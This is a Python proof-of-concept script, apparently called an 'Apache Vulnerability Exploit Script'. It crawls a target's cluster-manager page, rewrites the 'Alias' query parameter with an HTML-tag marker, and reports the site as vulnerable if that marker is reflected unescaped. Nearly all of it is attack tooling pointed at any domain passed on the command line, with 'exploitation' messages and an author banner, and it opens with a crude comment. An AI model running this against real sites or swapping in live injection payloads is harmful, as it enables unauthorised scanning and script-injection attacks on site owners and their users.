# HORNY MOMS modified
import requests
import argparse
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

class Colors:
    RED = '\033[91m'
    GREEN = '\033[1;49;92m'
    RESET = '\033[0m'

def fetch_url(url):
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        return response
    except requests.exceptions.Timeout:
        print(Colors.RED + f"Error: Request to {url} timed out." + Colors.RESET)
    except requests.exceptions.RequestException as e:
        print(Colors.RED + f"Error: {e}" + Colors.RESET)
    return None

def get_cluster_manager_url(base_url, path):
    print(Colors.GREEN + f"Initiating exploitation on {base_url}..." + Colors.RESET)
    response = fetch_url(base_url + path)
    if not response:
        return None

    print(Colors.GREEN + f"Checking exploit on {base_url}..." + Colors.RESET)
    soup = BeautifulSoup(response.text, 'html.parser')
    all_links = soup.find_all('a', href=True)

    for link in all_links:
        parsed_url = urlparse(link['href'])
        query_params = parse_qs(parsed_url.query)
        alias_value = query_params.get('Alias')

        if alias_value:
            print(Colors.GREEN + "Alias value found." + Colors.RESET)
            return link['href']

    print(Colors.RED + f"Error: Alias value not found on {base_url}." + Colors.RESET)
    return None

def update_alias_value(url):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query, keep_blank_values=True)
    query_params['Alias'] = ["<DedSec-47>"]
    updated_url = urlunparse(parsed_url._replace(query=urlencode(query_params, doseq=True)))
    print(Colors.GREEN + f"URL modified successfully: {updated_url}" + Colors.RESET)
    return updated_url

def check_response_for_value(url, check_value):
    response = fetch_url(url)
    if not response:
        return

    if check_value in response.text:
        print(Colors.RED + "Website is vulnerable! POC by:" + Colors.RESET)
    else:
        print(Colors.GREEN + "Website is not vulnerable. POC by:" + Colors.RESET)

    print(Colors.GREEN + """
      ____           _ ____                  _  _ _____
     |  _ \  ___  __| / ___|  ___  ___      | || |___  |
     | | | |/ _ \/ _` \___ \ / _ \/ __| ____| || |  / /
     | |_| |  __/ (_| |___) |  __/ (_  |____|__  | / /
     |____/ \___|\__,_|____/ \___|\___|        |_|/_/
                                 github.com/DedSec-47
    """ + Colors.RESET)

def main():
    parser = argparse.ArgumentParser(description="Apache Vulnerability Exploit Script")

    parser.add_argument('-t', '--target', help='Target domain (e.g., https://example.com)', required=True)
    parser.add_argument('-u', '--url', help='URL path (e.g., /cluster-manager)', required=True)

    args = parser.parse_args()

    cluster_manager_url = get_cluster_manager_url(args.target, args.url)
    if cluster_manager_url:
        modified_url = update_alias_value(args.target + cluster_manager_url)
        check_response_for_value(modified_url, "<DedSec-47>")

if __name__ == "__main__":
    main()
